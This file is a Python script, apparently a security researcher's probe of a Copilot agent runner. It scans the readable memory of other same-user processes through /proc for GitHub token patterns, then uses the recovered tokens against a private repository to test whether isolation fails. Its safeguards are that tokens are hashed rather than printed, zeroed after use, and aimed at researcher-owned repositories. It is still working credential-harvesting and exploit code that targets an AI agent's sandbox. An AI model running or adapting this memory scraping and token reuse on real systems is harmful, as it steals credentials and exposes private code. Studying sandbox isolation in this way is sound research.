#!/usr/bin/env python3
"""Bounded Copilot runner token-isolation probe.

The probe never prints or persists a credential. It scans readable same-UID
process memory for GitHub token-shaped values and uses candidates only for two
researcher-owned Git smart-HTTP read controls. Output contains booleans, status
codes, counts, and non-secret SHA-256 fingerprints only.
"""

from __future__ import annotations

import base64
import hashlib
import json
import os
import re
import urllib.error
import urllib.request


TOKEN_RE = re.compile(rb"gh[uspor]_[A-Za-z0-9]{30,120}")
PUBLIC_A = "abbey133710/bbvis-pp-control-226"
PRIVATE_B = "abbey133710/sweagent-sign-target-20260907"
MAX_MAPPING = 16 * 1024 * 1024
MAX_PROCESS_BYTES = 96 * 1024 * 1024
MAX_TOTAL_BYTES = 512 * 1024 * 1024
MAX_CANDIDATES = 12


def git_info_refs(repo: str, token: bytes | None) -> tuple[int, int, str]:
    url = f"https://github.com/{repo}.git/info/refs?service=git-upload-pack"
    headers = {"User-Agent": "controlled-copilot-token-isolation-probe"}
    if token is not None:
        raw = b"x-access-token:" + token
        headers["Authorization"] = "Basic " + base64.b64encode(raw).decode("ascii")
    request = urllib.request.Request(url, headers=headers)
    try:
        with urllib.request.urlopen(request, timeout=15) as response:
            body = response.read(1024 * 1024)
            return response.status, len(body), hashlib.sha256(body).hexdigest()
    except urllib.error.HTTPError as error:
        body = error.read(64 * 1024)
        return error.code, len(body), hashlib.sha256(body).hexdigest()
    except Exception:
        return 0, 0, ""


def readable_regions(pid: str):
    try:
        with open(f"/proc/{pid}/maps", "r", encoding="utf-8", errors="replace") as maps:
            for line in maps:
                fields = line.split()
                if len(fields) < 2 or "r" not in fields[1]:
                    continue
                start_s, end_s = fields[0].split("-", 1)
                start, end = int(start_s, 16), int(end_s, 16)
                size = end - start
                if 0 < size <= MAX_MAPPING:
                    yield start, size
    except (OSError, ValueError):
        return


def candidates_from_proc() -> tuple[list[bytearray], dict[str, int | bool]]:
    found: dict[bytes, bytearray] = {}
    scanned = 0
    readable_processes = 0
    permission_denials = 0
    own_pid = str(os.getpid())

    for pid in sorted((p for p in os.listdir("/proc") if p.isdigit()), key=int):
        if pid == own_pid or scanned >= MAX_TOTAL_BYTES or len(found) >= MAX_CANDIDATES:
            continue
        process_bytes = 0
        process_read = False
        try:
            mem = open(f"/proc/{pid}/mem", "rb", buffering=0)
        except PermissionError:
            permission_denials += 1
            continue
        except OSError:
            continue
        with mem:
            for start, size in readable_regions(pid):
                if process_bytes >= MAX_PROCESS_BYTES or scanned >= MAX_TOTAL_BYTES:
                    break
                take = min(size, MAX_PROCESS_BYTES - process_bytes, MAX_TOTAL_BYTES - scanned)
                try:
                    mem.seek(start)
                    data = mem.read(take)
                except OSError:
                    continue
                process_read = True
                process_bytes += len(data)
                scanned += len(data)
                for match in TOKEN_RE.finditer(data):
                    value = match.group(0)
                    digest = hashlib.sha256(value).digest()
                    found.setdefault(digest, bytearray(value))
                    if len(found) >= MAX_CANDIDATES:
                        break
                del data
                if len(found) >= MAX_CANDIDATES:
                    break
        if process_read:
            readable_processes += 1

    return list(found.values()), {
        "proc_available": os.path.isdir("/proc"),
        "readable_processes": readable_processes,
        "permission_denials": permission_denials,
        "bytes_scanned": scanned,
    }


def main() -> int:
    unauth_b_status, _, _ = git_info_refs(PRIVATE_B, None)
    candidates, scan = candidates_from_proc()
    successful_fingerprint = ""
    a_status = 0
    b_status = 0
    b_body_size = 0
    b_body_hash = ""

    for candidate in candidates:
        current_a_status, _, _ = git_info_refs(PUBLIC_A, bytes(candidate))
        current_b_status, current_b_size, current_b_hash = git_info_refs(PRIVATE_B, bytes(candidate))
        if current_a_status == 200 and current_b_status == 200:
            successful_fingerprint = hashlib.sha256(candidate).hexdigest()
            a_status = current_a_status
            b_status = current_b_status
            b_body_size = current_b_size
            b_body_hash = current_b_hash
            break
    for candidate in candidates:
        candidate[:] = b"\x00" * len(candidate)

    result = {
        "probe_version": 1,
        "targets": {"public_a": PUBLIC_A, "private_b": PRIVATE_B},
        "scan": scan,
        "token_candidate_count": len(candidates),
        "unauthenticated_private_b_status": unauth_b_status,
        "credential_recovered": bool(successful_fingerprint),
        "successful_candidate_sha256": successful_fingerprint,
        "public_a_status_via_candidate": a_status,
        "private_b_status_via_candidate": b_status,
        "private_b_advertisement_size": b_body_size,
        "private_b_advertisement_sha256": b_body_hash,
        "private_b_read_boundary_crossed": unauth_b_status in (401, 403, 404) and b_status == 200,
        "credential_bytes_persisted": False,
    }
    output = json.dumps(result, sort_keys=True, indent=2) + "\n"
    with open("HGT_TOKEN_PROBE_RESULT.json", "x", encoding="utf-8") as result_file:
        result_file.write(output)
    print(output, end="")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
